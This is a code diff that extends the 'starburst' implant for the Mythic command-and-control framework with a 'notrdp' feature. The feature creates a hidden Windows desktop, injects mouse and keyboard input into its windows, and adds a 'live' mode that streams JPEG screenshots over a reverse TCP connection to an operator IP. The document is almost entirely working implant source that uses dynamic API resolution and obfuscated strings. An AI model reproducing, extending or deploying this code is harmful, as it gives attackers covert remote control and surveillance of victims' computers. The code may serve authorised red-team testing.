++        if (received_len <= 0)
++          break;
++
++        for (int i = 0; i < received_len; i++) {
++          if (input_len == sizeof(input_buffer))
++            input_len = 0;
++          input_buffer[input_len++] = received[i];
++
++          while (input_len >= NR_LIVE_INPUT_MSG) {
++            if (input_buffer[0] != NR_LIVE_MSG_INPUT) {
++              for (uint32_t j = 1; j < input_len; j++)
++                input_buffer[j - 1] = input_buffer[j];
++              input_len--;
++              continue;
++            }
++
++            int32_t x =
++                static_cast<int16_t>((input_buffer[1] << 8) | input_buffer[2]);
++            int32_t y =
++                static_cast<int16_t>((input_buffer[3] << 8) | input_buffer[4]);
++            int32_t action =
++                static_cast<int16_t>((input_buffer[5] << 8) | input_buffer[6]);
++            int32_t key =
++                static_cast<int16_t>((input_buffer[7] << 8) | input_buffer[8]);
++            if (state->active)
++              nr_input_resolved(state, &input_apis, x, y, action, key);
++
++            uint32_t remaining = input_len - NR_LIVE_INPUT_MSG;
++            for (uint32_t j = 0; j < remaining; j++)
++              input_buffer[j] = input_buffer[j + NR_LIVE_INPUT_MSG];
++            input_len = remaining;
++          }
++        }
++      }
++
++      uint8_t *jpeg = nullptr;
++      uint32_t jpeg_len = 0;
++      if (!nr_capture_jpeg(inst, state, &capture_apis, &jpeg, &jpeg_len))
++        break;
++
++      uint8_t header[5];
++      header[0] = NR_LIVE_MSG_FRAME;
++      header[1] = static_cast<uint8_t>(jpeg_len >> 24);
++      header[2] = static_cast<uint8_t>(jpeg_len >> 16);
++      header[3] = static_cast<uint8_t>(jpeg_len >> 8);
++      header[4] = static_cast<uint8_t>(jpeg_len);
++      bool sent = nr_send_all(send_socket, sock, header, sizeof(header)) &&
++                  nr_send_all(send_socket, sock, jpeg, jpeg_len);
++      inst.heap_free(jpeg);
++      if (!sent)
++        break;
++
++      inst.kernel32.Sleep(1000 / state->live_fps);
++    }
++  } while (0);
++
++  if (hidden_active && original_desktop)
++    capture_apis.switch_desktop(original_desktop);
++  if (thread_on_hidden && original_desktop)
++    capture_apis.set_thread_desktop(original_desktop);
++
++  if (sock != NR_LIVE_INVALID && state->live_sock == sock) {
++    state->live_sock = NR_LIVE_INVALID;
++    if (close_socket)
++      close_socket(sock);
++  }
++  if (capture_started)
++    capture_apis.gdiplus_shutdown(capture_apis.gdiplus_token);
++  if (wsa_started)
++    wsa_cleanup();
++
++  InterlockedExchange(&state->live_running, 0);
++  inst.heap_free(ctx);
++  return 0;
++}
++
++static auto declfn nr_live_start(instance &inst, NotRdpState *state,
++                                 const char *host, uint32_t port, uint32_t fps,
++                                 uint32_t scale) -> bool {
++  if (state->live_running || state->live_thread)
++    nr_live_stop(inst, state);
++
++  STK_USER32(_u32m);
++  auto h_user32 = inst.kernel32.LoadLibraryA(_u32m);
++  if (!h_user32)
++    return false;
++  auto get_metrics = reinterpret_cast<fn_GetSystemMetrics>(
++      inst.kernel32.GetProcAddress(reinterpret_cast<HMODULE>(h_user32),
++                                   symbol<LPCSTR>("GetSystemMetrics")));
++  if (!get_metrics)
++    return false;
++
++  int32_t width = get_metrics(NR_SM_CXSCREEN);
++  int32_t height = get_metrics(NR_SM_CYSCREEN);
++  if (width <= 0 || height <= 0) {
++    width = 1920;
++    height = 1080;
++  }
++  state->live_w = static_cast<uint32_t>(width);
++  state->live_h = static_cast<uint32_t>(height);
++  state->live_fps = fps;
++  state->live_scale = scale;
++  state->live_sock = NR_LIVE_INVALID;
++
++  auto ctx = static_cast<NrLiveCtx *>(inst.heap_alloc(sizeof(NrLiveCtx)));
++  if (!ctx)
++    return false;
++  memory::zero(ctx, sizeof(NrLiveCtx));
++  ctx->inst = &inst;
++  ctx->state = state;
++  uint32_t host_len = 0;
++  while (host[host_len] && host_len < sizeof(ctx->host) - 1) {
++    ctx->host[host_len] = host[host_len];
++    host_len++;
++  }
++  ctx->host[host_len] = 0;
++  ctx->port = port;
++
++  InterlockedExchange(&state->live_running, 1);
++  state->live_thread = inst.kernel32.CreateThread(
++      nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(nr_live_thread), ctx,
++      0, nullptr);
++  if (!state->live_thread) {
++    InterlockedExchange(&state->live_running, 0);
++    inst.heap_free(ctx);
++    return false;
++  }
++  return true;
 +}
 +
 +/* ── launch explorer.exe on the hidden desktop ── */
@@ -523,120 +1250,223 @@ index 0000000..1001892
 +}
 +
 +/* ── inject mouse/keyboard input via PostMessage ── */
-+static auto declfn nr_input(instance &inst, NotRdpState *state, int32_t x,
-+                            int32_t y, int32_t action, int32_t key) -> void {
++static auto declfn nr_init_input_apis(instance &inst, NrInputApis *apis)
++    -> bool {
++  memory::zero(apis, sizeof(NrInputApis));
++
 +  STK_USER32(_u32);
 +  auto h_user32 = inst.kernel32.LoadLibraryA(_u32);
 +  if (!h_user32)
++    return false;
++  auto user32 = reinterpret_cast<HMODULE>(h_user32);
++  auto kernel32 = reinterpret_cast<HMODULE>(inst.kernel32.handle);
++  auto gpa = inst.kernel32.GetProcAddress;
++
++  apis->set_thread_desktop = reinterpret_cast<fn_SetThreadDesktop>(
++      gpa(user32, symbol<LPCSTR>("SetThreadDesktop")));
++  apis->get_thread_desktop = reinterpret_cast<fn_GetThreadDesktop>(
++      gpa(user32, symbol<LPCSTR>("GetThreadDesktop")));
++  apis->get_current_thread_id = reinterpret_cast<fn_GetCurrentThreadId>(
++      gpa(kernel32, symbol<LPCSTR>("GetCurrentThreadId")));
++  apis->post_message = reinterpret_cast<fn_PostMessageW>(
++      gpa(user32, symbol<LPCSTR>("PostMessageW")));
++  apis->window_from_point = reinterpret_cast<fn_WindowFromPoint>(
++      gpa(user32, symbol<LPCSTR>("WindowFromPoint")));
++  apis->screen_to_client = reinterpret_cast<fn_ScreenToClient>(
++      gpa(user32, symbol<LPCSTR>("ScreenToClient")));
++  apis->child_from_point = reinterpret_cast<fn_ChildWindowFromPointEx>(
++      gpa(user32, symbol<LPCSTR>("ChildWindowFromPointEx")));
++  apis->get_window_thread = reinterpret_cast<fn_GetWindowThreadProcessId>(
++      gpa(user32, symbol<LPCSTR>("GetWindowThreadProcessId")));
++  apis->attach_thread_input = reinterpret_cast<fn_AttachThreadInput>(
++      gpa(user32, symbol<LPCSTR>("AttachThreadInput")));
++  apis->set_focus =
++      reinterpret_cast<fn_SetFocus>(gpa(user32, symbol<LPCSTR>("SetFocus")));
++  apis->map_virtual_key = reinterpret_cast<fn_MapVirtualKeyA>(
++      gpa(user32, symbol<LPCSTR>("MapVirtualKeyA")));
++
++  const void *required[11] = {
++      (const void *)apis->set_thread_desktop,
++      (const void *)apis->get_thread_desktop,
++      (const void *)apis->get_current_thread_id,
++      (const void *)apis->post_message,
++      (const void *)apis->window_from_point,
++      (const void *)apis->screen_to_client,
++      (const void *)apis->child_from_point,
++      (const void *)apis->get_window_thread,
++      (const void *)apis->attach_thread_input,
++      (const void *)apis->set_focus,
++      (const void *)apis->map_virtual_key,
++  };
++  for (uint32_t i = 0; i < 11; i++) {
++    if (!required[i])
++      return false;
++  }
++  return true;
++}
++
++static auto declfn nr_is_extended_key(int32_t key) -> bool {
++  switch (key) {
++  case 33:  /* VK_PRIOR */
++  case 34:  /* VK_NEXT */
++  case 35:  /* VK_END */
++  case 36:  /* VK_HOME */
++  case 37:  /* VK_LEFT */
++  case 38:  /* VK_UP */
++  case 39:  /* VK_RIGHT */
++  case 40:  /* VK_DOWN */
++  case 44:  /* VK_SNAPSHOT */
++  case 45:  /* VK_INSERT */
++  case 46:  /* VK_DELETE */
++  case 91:  /* VK_LWIN */
++  case 92:  /* VK_RWIN */
++  case 93:  /* VK_APPS */
++  case 111: /* VK_DIVIDE */
++  case 144: /* VK_NUMLOCK */
++    return true;
++  default:
++    return false;
++  }
++}
++
++static auto declfn nr_input_resolved(NotRdpState *state, NrInputApis *apis,
++                                     int32_t x, int32_t y, int32_t action,
++                                     int32_t key) -> void {
++  void *original_desktop =
++      apis->get_thread_desktop(apis->get_current_thread_id());
++  if (!original_desktop)
 +    return;
 +
-+  auto pOpenDesk = reinterpret_cast<fn_OpenDesktopW>(
-+      inst.kernel32.GetProcAddress(h_user32, symbol<LPCSTR>("OpenDesktopW")));
-+  auto pSetThreadDesk =
-+      reinterpret_cast<fn_SetThreadDesktop>(inst.kernel32.GetProcAddress(
-+          h_user32, symbol<LPCSTR>("SetThreadDesktop")));
-+  auto pGetThreadDesk =
-+      reinterpret_cast<fn_GetThreadDesktop>(inst.kernel32.GetProcAddress(
-+          h_user32, symbol<LPCSTR>("GetThreadDesktop")));
-+  auto pGetCurThreadId =
-+      reinterpret_cast<uint32_t(WINAPI *)(void)>(inst.kernel32.GetProcAddress(
-+          reinterpret_cast<HMODULE>(inst.kernel32.handle),
-+          symbol<LPCSTR>("GetCurrentThreadId")));
-+  auto pCloseDesk = reinterpret_cast<fn_CloseDesktop>(
-+      inst.kernel32.GetProcAddress(h_user32, symbol<LPCSTR>("CloseDesktop")));
-+  auto pPostMessage = reinterpret_cast<fn_PostMessageW>(
-+      inst.kernel32.GetProcAddress(h_user32, symbol<LPCSTR>("PostMessageW")));
-+  auto pWindowFromPoint =
-+      reinterpret_cast<fn_WindowFromPoint>(inst.kernel32.GetProcAddress(
-+          h_user32, symbol<LPCSTR>("WindowFromPoint")));
-+  auto pScreenToClient = reinterpret_cast<fn_ScreenToClient>(
-+      inst.kernel32.GetProcAddress(h_user32, symbol<LPCSTR>("ScreenToClient")));
-+
-+  if (!pOpenDesk || !pSetThreadDesk || !pGetThreadDesk || !pGetCurThreadId ||
-+      !pCloseDesk || !pPostMessage || !pWindowFromPoint || !pScreenToClient)
++  bool switched = original_desktop != state->h_desktop;
++  if (switched && !apis->set_thread_desktop(state->h_desktop))
 +    return;
 +
-+  wchar_t w_desk_name[32];
-+  memory::zero(w_desk_name, 64);
-+  nr_to_wide(inst, "StarburstHidden", w_desk_name, 32);
++  NrPoint screen_point = {x, y};
++  void *target = apis->window_from_point(screen_point);
++  if (target) {
++    const uint32_t child_flags =
++        NR_CWP_SKIPINVISIBLE | NR_CWP_SKIPDISABLED | NR_CWP_SKIPTRANSPARENT;
++    for (uint32_t depth = 0; depth < 8; depth++) {
++      NrPoint child_point = {x, y};
++      if (!apis->screen_to_client(target, &child_point))
++        break;
++      void *child = apis->child_from_point(target, child_point, child_flags);
++      if (!child || child == target)
++        break;
++      target = child;
++    }
 +
-+  void *h_orig = pGetThreadDesk(pGetCurThreadId());
-+  void *h_desk = pOpenDesk(w_desk_name, 0, 0, NR_GENERIC_READ);
-+  if (!h_desk)
-+    return;
-+  pSetThreadDesk(h_desk);
++    NrPoint client_point = {x, y};
++    if (apis->screen_to_client(target, &client_point)) {
++      uint32_t packed_point =
++          static_cast<uint16_t>(client_point.x) |
++          (static_cast<uint32_t>(static_cast<uint16_t>(client_point.y)) << 16);
++      intptr_t mouse_lparam =
++          static_cast<intptr_t>(static_cast<uintptr_t>(packed_point));
 +
-+  /* Find window at coordinates */
-+  /* POINT = { LONG x; LONG y; } = 8 bytes on x64 */
-+  uint8_t pt_buf[8];
-+  *(int32_t *)(pt_buf) = x;
-+  *(int32_t *)(pt_buf + 4) = y;
-+  void *h_target = pWindowFromPoint(x, y);
-+
-+  if (h_target) {
-+    uint8_t client_buf[8];
-+    *(int32_t *)(client_buf) = x;
-+    *(int32_t *)(client_buf + 4) = y;
-+    pScreenToClient(h_target, client_buf);
-+
-+    int32_t cx = *(int32_t *)(client_buf);
-+    int32_t cy = *(int32_t *)(client_buf + 4);
-+    intptr_t lParam = (intptr_t)((cy << 16) | (cx & 0xFFFF));
-+    uintptr_t wParam = 0;
-+
-+    switch (action) {
-+    case 0:
-+      pPostMessage(h_target, NR_WM_MOUSEMOVE, 0, lParam);
-+      break;
-+    case 1:
-+      pPostMessage(h_target, NR_WM_LBUTTONDOWN, NR_MK_LBUTTON, lParam);
-+      pPostMessage(h_target, NR_WM_LBUTTONUP, 0, lParam);
-+      break;
-+    case 2:
-+      pPostMessage(h_target, NR_WM_RBUTTONDOWN, NR_MK_RBUTTON, lParam);
-+      pPostMessage(h_target, NR_WM_RBUTTONUP, 0, lParam);
-+      break;
-+    case 3:
-+      pPostMessage(h_target, NR_WM_LBUTTONDOWN, NR_MK_LBUTTON, lParam);
-+      pPostMessage(h_target, NR_WM_LBUTTONUP, 0, lParam);
-+      pPostMessage(h_target, NR_WM_LBUTTONDOWN, NR_MK_LBUTTON | 0x0004, lParam);
-+      pPostMessage(h_target, NR_WM_LBUTTONUP, 0x0004, lParam);
-+      break;
-+    case 4:
-+      pPostMessage(h_target, NR_WM_LBUTTONDOWN, NR_MK_LBUTTON, lParam);
-+      break;
-+    case 5:
-+      pPostMessage(h_target, NR_WM_LBUTTONUP, 0, lParam);
-+      break;
-+    case 6:
-+      pPostMessage(h_target, NR_WM_RBUTTONDOWN, NR_MK_RBUTTON, lParam);
-+      break;
-+    case 7:
-+      pPostMessage(h_target, NR_WM_RBUTTONUP, 0, lParam);
-+      break;
-+    case 10:
-+      if (key > 0) {
-+        pPostMessage(h_target, NR_WM_KEYDOWN, (uintptr_t)key, 0);
-+        pPostMessage(h_target, NR_WM_KEYUP, (uintptr_t)key, 0);
++      if (action >= 1 && action <= 7) {
++        uint32_t target_thread = apis->get_window_thread(target, nullptr);
++        uint32_t current_thread = apis->get_current_thread_id();
++        if (target_thread && target_thread != current_thread) {
++          int attached =
++              apis->attach_thread_input(current_thread, target_thread, 1);
++          apis->set_focus(target);
++          if (attached)
++            apis->attach_thread_input(current_thread, target_thread, 0);
++        } else {
++          apis->set_focus(target);
++        }
 +      }
-+      break;
-+    case 11:
-+      if (key > 0)
-+        pPostMessage(h_target, NR_WM_KEYDOWN, (uintptr_t)key, 0);
-+      break;
-+    case 12:
-+      if (key > 0)
-+        pPostMessage(h_target, NR_WM_KEYUP, (uintptr_t)key, 0);
-+      break;
++
++      switch (action) {
++      case 0:
++        apis->post_message(target, NR_WM_MOUSEMOVE,
++                           static_cast<uintptr_t>(key) &
++                               (NR_MK_LBUTTON | NR_MK_RBUTTON),
++                           mouse_lparam);
++        break;
++      case 1:
++        apis->post_message(target, NR_WM_LBUTTONDOWN, NR_MK_LBUTTON,
++                           mouse_lparam);
++        apis->post_message(target, NR_WM_LBUTTONUP, 0, mouse_lparam);
++        break;
++      case 2:
++        apis->post_message(target, NR_WM_RBUTTONDOWN, NR_MK_RBUTTON,
++                           mouse_lparam);
++        apis->post_message(target, NR_WM_RBUTTONUP, 0, mouse_lparam);
++        break;
++      case 3:
++        apis->post_message(target, NR_WM_LBUTTONDOWN, NR_MK_LBUTTON,
++                           mouse_lparam);
++        apis->post_message(target, NR_WM_LBUTTONUP, 0, mouse_lparam);
++        apis->post_message(target, NR_WM_LBUTTONDBLCLK, NR_MK_LBUTTON,
++                           mouse_lparam);
++        apis->post_message(target, NR_WM_LBUTTONUP, 0, mouse_lparam);
++        break;
++      case 4:
++        apis->post_message(target, NR_WM_LBUTTONDOWN, NR_MK_LBUTTON,
++                           mouse_lparam);
++        break;
++      case 5:
++        apis->post_message(target, NR_WM_LBUTTONUP, 0, mouse_lparam);
++        break;
++      case 6:
++        apis->post_message(target, NR_WM_RBUTTONDOWN, NR_MK_RBUTTON,
++                           mouse_lparam);
++        break;
++      case 7:
++        apis->post_message(target, NR_WM_RBUTTONUP, 0, mouse_lparam);
++        break;
++      case 8: {
++        uintptr_t wheel_wparam = static_cast<uintptr_t>(
++            static_cast<uint32_t>(static_cast<uint16_t>(key)) << 16);
++        intptr_t wheel_lparam = static_cast<intptr_t>(static_cast<uintptr_t>(
++            static_cast<uint16_t>(x) |
++            (static_cast<uint32_t>(static_cast<uint16_t>(y)) << 16)));
++        apis->post_message(target, NR_WM_MOUSEWHEEL, wheel_wparam,
++                           wheel_lparam);
++        break;
++      }
++      case 10:
++      case 11:
++      case 12:
++        if (key > 0) {
++          uint32_t scan = apis->map_virtual_key(static_cast<uint32_t>(key), 0);
++          uint32_t key_lparam = 1 | ((scan & 0xFF) << 16);
++          if (nr_is_extended_key(key))
++            key_lparam |= 1u << 24;
++          intptr_t key_down =
++              static_cast<intptr_t>(static_cast<uintptr_t>(key_lparam));
++          intptr_t key_up = static_cast<intptr_t>(
++              static_cast<uintptr_t>(key_lparam | (1u << 30) | (1u << 31)));
++          if (action == 10 || action == 11)
++            apis->post_message(target, NR_WM_KEYDOWN,
++                               static_cast<uintptr_t>(key), key_down);
++          if (action == 10 || action == 12)
++            apis->post_message(target, NR_WM_KEYUP, static_cast<uintptr_t>(key),
++                               key_up);
++        }
++        break;
++      }
 +    }
 +  }
 +
-+  pSetThreadDesk(h_orig);
-+  pCloseDesk(h_desk);
++  if (switched)
++    apis->set_thread_desktop(original_desktop);
++}
++
++static auto declfn nr_input(instance &inst, NotRdpState *state, int32_t x,
++                            int32_t y, int32_t action, int32_t key) -> void {
++  NrInputApis apis;
++  if (nr_init_input_apis(inst, &apis))
++    nr_input_resolved(state, &apis, x, y, action, key);
 +}
 +
 +/* ── teardown ── */
 +static auto declfn nr_stop(instance &inst, NotRdpState *state) -> void {
++  if (state->live_running || state->live_thread)
++    nr_live_stop(inst, state);
++
 +  if (state->h_shell_proc) {
 +    auto pTerm =
 +        reinterpret_cast<fn_TerminateProcess>(inst.kernel32.GetProcAddress(
@@ -912,23 +1742,94 @@ index 0000000..1001892
 +        queue_response(inst, task_uuid, RESPONSE_SUCCESS,
 +                       symbol<char *>(const_cast<char *>("input sent")));
 +
-+        /* ── STOP ── */
++        /* ── LIVE ── */
 +      } else {
-+        char stop_s[] = {'s', 't', 'o', 'p', 0};
-+        if (str_ncmp(action, stop_s, 4) == 0) {
++        char live_s[] = {'l', 'i', 'v', 'e', 0};
++        if (str_ncmp(action, live_s, 4) == 0) {
 +          auto state = static_cast<NotRdpState *>(inst.notrdp_state_ptr);
-+          if (!state) {
++          if (!state || !state->active) {
 +            queue_response(
 +                inst, task_uuid, RESPONSE_ERROR,
-+                symbol<char *>(const_cast<char *>("notRDP not running")));
++                symbol<char *>(const_cast<char *>("notRDP not started")));
 +            return;
 +          }
-+          nr_stop(inst, state);
++
++          uint32_t host_len = 0;
++          auto host_arg = parser_string(params, &host_len);
++          if (!host_arg || host_len == 0 || host_len >= 64) {
++            queue_response(inst, task_uuid, RESPONSE_ERROR,
++                           symbol<char *>(const_cast<char *>(
++                               "live needs <ip> <port> [fps] [scale]")));
++            return;
++          }
++
++          char host_buf[64];
++          memory::zero(host_buf, sizeof(host_buf));
++          memory::copy(host_buf, host_arg, host_len);
++          host_buf[host_len] = 0;
++
++          char stop_s2[] = {'s', 't', 'o', 'p', 0};
++          if (host_len == 4 && str_ncmp(host_buf, stop_s2, 4) == 0) {
++            nr_live_stop(inst, state);
++            queue_response(inst, task_uuid, RESPONSE_SUCCESS,
++                           symbol<char *>(const_cast<char *>("live stopped")));
++            return;
++          }
++
++          int32_t port = static_cast<int32_t>(parser_int32(params));
++          int32_t fps = static_cast<int32_t>(parser_int32(params));
++          int32_t scale = static_cast<int32_t>(parser_int32(params));
++          if (port <= 0 || port > 65535) {
++            queue_response(inst, task_uuid, RESPONSE_ERROR,
++                           symbol<char *>(const_cast<char *>("bad port")));
++            return;
++          }
++          if (fps < 0 || fps > 10) {
++            queue_response(
++                inst, task_uuid, RESPONSE_ERROR,
++                symbol<char *>(const_cast<char *>("fps must be 1-10")));
++            return;
++          }
++          if (scale < 0 || scale > 4) {
++            queue_response(
++                inst, task_uuid, RESPONSE_ERROR,
++                symbol<char *>(const_cast<char *>("scale must be 1-4")));
++            return;
++          }
++          if (fps == 0)
++            fps = 2;
++          if (scale == 0)
++            scale = 1;
++          if (!nr_live_start(inst, state, host_buf, (uint32_t)port,
++                             (uint32_t)fps, (uint32_t)scale)) {
++            queue_response(
++                inst, task_uuid, RESPONSE_ERROR,
++                symbol<char *>(const_cast<char *>("live thread failed")));
++            return;
++          }
 +          queue_response(inst, task_uuid, RESPONSE_SUCCESS,
-+                         symbol<char *>(const_cast<char *>("notRDP stopped")));
++                         symbol<char *>(const_cast<char *>(
++                             "live started, connecting to viewer")));
++
 +        } else {
-+          queue_response(inst, task_uuid, RESPONSE_ERROR,
-+                         symbol<char *>(const_cast<char *>("unknown action")));
++          char stop_s[] = {'s', 't', 'o', 'p', 0};
++          if (str_ncmp(action, stop_s, 4) == 0) {
++            auto state = static_cast<NotRdpState *>(inst.notrdp_state_ptr);
++            if (!state) {
++              queue_response(
++                  inst, task_uuid, RESPONSE_ERROR,
++                  symbol<char *>(const_cast<char *>("notRDP not running")));
++              return;
++            }
++            nr_stop(inst, state);
++            queue_response(
++                inst, task_uuid, RESPONSE_SUCCESS,
++                symbol<char *>(const_cast<char *>("notRDP stopped")));
++          } else {
++            queue_response(
++                inst, task_uuid, RESPONSE_ERROR,
++                symbol<char *>(const_cast<char *>("unknown action")));
++          }
 +        }
 +      }
 +    }
@@ -975,10 +1876,10 @@ index 633413e..9fd1ddc 100644
 +from starburst.agent_functions.notrdp import *
 diff --git a/Payload_Type/starburst/starburst/agent_functions/notrdp.py b/Payload_Type/starburst/starburst/agent_functions/notrdp.py
 new file mode 100644
-index 0000000..cb4b1c5
+index 0000000..7ed2623
 --- /dev/null
 +++ b/Payload_Type/starburst/starburst/agent_functions/notrdp.py
-@@ -0,0 +1,153 @@
+@@ -0,0 +1,232 @@
 +from mythic_container.MythicCommandBase import *
 +from mythic_container.MythicRPC import *
 +
@@ -992,9 +1893,9 @@ index 0000000..cb4b1c5
 +                cli_name="Action",
 +                display_name="Action",
 +                type=ParameterType.ChooseOne,
-+                choices=["start", "shot", "input", "stop"],
++                choices=["start", "shot", "input", "live", "stop"],
 +                default_value="start",
-+                description="start: create hidden desktop; shot: capture screen; input: inject mouse/keyboard; stop: teardown",
++                description="start: create hidden desktop; shot: capture screen; input: inject mouse/keyboard; live: reverse-connect to browser viewer; stop: teardown",
 +                parameter_group_info=[
 +                    ParameterGroupInfo(
 +                        required=True,
@@ -1039,7 +1940,7 @@ index 0000000..cb4b1c5
 +                display_name="Mouse/Key Action",
 +                type=ParameterType.Number,
 +                default_value=0,
-+                description="0=move,1=lclick,2=rclick,3=dblclick,4=ldown,5=lup,6=rdown,7=rup,10=kpress,11=kdown,12=kup",
++                description="0=move,1=lclick,2=rclick,3=dblclick,4=ldown,5=lup,6=rdown,7=rup,8=scroll,10=kpress,11=kdown,12=kup",
 +                parameter_group_info=[
 +                    ParameterGroupInfo(
 +                        required=False,
@@ -1060,6 +1961,66 @@ index 0000000..cb4b1c5
 +                        required=False,
 +                        group_name="Default",
 +                        ui_position=5,
++                    )
++                ],
++            ),
++            CommandParameter(
++                name="host",
++                cli_name="Host",
++                display_name="Viewer Host",
++                type=ParameterType.String,
++                default_value="",
++                description="Operator IP for live streaming (live action only)",
++                parameter_group_info=[
++                    ParameterGroupInfo(
++                        required=False,
++                        group_name="Default",
++                        ui_position=6,
++                    )
++                ],
++            ),
++            CommandParameter(
++                name="port",
++                cli_name="Port",
++                display_name="Viewer Port",
++                type=ParameterType.Number,
++                default_value=8124,
++                description="Operator viewer agent-port (live action only)",
++                parameter_group_info=[
++                    ParameterGroupInfo(
++                        required=False,
++                        group_name="Default",
++                        ui_position=7,
++                    )
++                ],
++            ),
++            CommandParameter(
++                name="fps",
++                cli_name="Fps",
++                display_name="Frames per second",
++                type=ParameterType.Number,
++                default_value=2,
++                description="JPEG frames per second (live action only)",
++                parameter_group_info=[
++                    ParameterGroupInfo(
++                        required=False,
++                        group_name="Default",
++                        ui_position=8,
++                    )
++                ],
++            ),
++            CommandParameter(
++                name="scale",
++                cli_name="Scale",
++                display_name="Resolution divisor",
++                type=ParameterType.Number,
++                default_value=1,
++                description="Output divisor from 1 (full resolution) through 4",
++                parameter_group_info=[
++                    ParameterGroupInfo(
++                        required=False,
++                        group_name="Default",
++                        ui_position=9,
 +                    )
 +                ],
 +            ),
@@ -1084,6 +2045,19 @@ index 0000000..cb4b1c5
 +                    self.add_arg("mouse_action", int(parts[3]))
 +                if len(parts) >= 5:
 +                    self.add_arg("key", int(parts[4]))
++            elif parts and parts[0] == "live":
++                self.add_arg("action", "live")
++                if len(parts) >= 2 and parts[1].lower() == "stop":
++                    self.add_arg("host", "stop")
++                    return
++                if len(parts) >= 2:
++                    self.add_arg("host", parts[1])
++                if len(parts) >= 3:
++                    self.add_arg("port", int(parts[2]))
++                if len(parts) >= 4:
++                    self.add_arg("fps", int(parts[3]))
++                if len(parts) >= 5:
++                    self.add_arg("scale", int(parts[4]))
 +            else:
 +                self.add_arg("action", self.command_line.strip())
 +
@@ -1091,17 +2065,17 @@ index 0000000..cb4b1c5
 +class NotRdpCommand(CommandBase):
 +    cmd = "notrdp"
 +    needs_admin = False
-+    help_cmd = "notrdp [start|shot|stop] or notrdp input <x> <y> [action] [key]"
-+    description = (
-+        "Invisible alternate Windows desktop with screen capture and "
-+        "interactive mouse/keyboard input. start: create hidden desktop + "
-+        "explorer + persistent shell; shot: capture BMP screenshot; input: "
-+        "PostMessage-based mouse/keyboard injection; stop: teardown. "
-+        "Note: when the agent runs as SYSTEM in session 0, captures come "
-+        "back black (session 0 desktops do not render); launch the agent "
-+        "inside a user session for usable screenshots."
++    help_cmd = (
++        "notrdp [start|shot|stop] | notrdp input <x> <y> [action] [key] | "
++        "notrdp live <ip> <port> [fps] [scale] | notrdp live stop"
 +    )
-+    version = 1
++    description = (
++        "Alternate Windows desktop with tasked BMP capture and input, plus "
++        "interactive JPEG streaming to the browser viewer over reverse TCP. "
++        "The agent must run in a user session because session 0 desktops do "
++        "not render. Use the default sleep mask while live streaming."
++    )
++    version = 2
 +    supported_ui_features = []
 +    author = "@operator"
 +    attackmapping = ["T1113", "T1562.001"]
@@ -1128,15 +2102,21 @@ index 0000000..cb4b1c5
 +            ma = taskData.args.get_arg("mouse_action") or 0
 +            key = taskData.args.get_arg("key") or 0
 +            response.DisplayParams = f"-Action input ({x},{y}) action={ma} key={key}"
++        elif action == "live":
++            host = taskData.args.get_arg("host") or ""
++            port = taskData.args.get_arg("port") or 8124
++            fps = taskData.args.get_arg("fps") or 2
++            scale = taskData.args.get_arg("scale") or 1
++            response.DisplayParams = f"-Action live {host}:{port} fps={fps} scale={scale}"
 +        return response
 +
 +    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
 +        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
 diff --git a/Payload_Type/starburst/translator/to_agent.py b/Payload_Type/starburst/translator/to_agent.py
-index e00fbb0..a152590 100644
+index e00fbb0..5c8e3fb 100644
 --- a/Payload_Type/starburst/translator/to_agent.py
 +++ b/Payload_Type/starburst/translator/to_agent.py
-@@ -476,6 +476,17 @@ def pack_command_params(cmd_name, params):
+@@ -476,6 +476,24 @@ def pack_command_params(cmd_name, params):
              pk.add_bytes(b"")
          pk.add_string(params.get("arguments", ""))
  
@@ -1150,7 +2130,14 @@ index e00fbb0..a152590 100644
 +            pk.add_int32(int(params.get("y", 0) or 0))
 +            pk.add_int32(int(params.get("mouse_action", 0) or 0))
 +            pk.add_int32(int(params.get("key", 0) or 0))
-+
++        elif str(action) == "live":
++            host = params.get("host", "")
++            if isinstance(host, list):
++                host = host[0] if host else ""
++            pk.add_string(str(host))
++            pk.add_int32(int(params.get("port", 0) or 0))
++            pk.add_int32(int(params.get("fps", 0) or 0))
++            pk.add_int32(int(params.get("scale", 0) or 0))
      return pk.build()
  
  
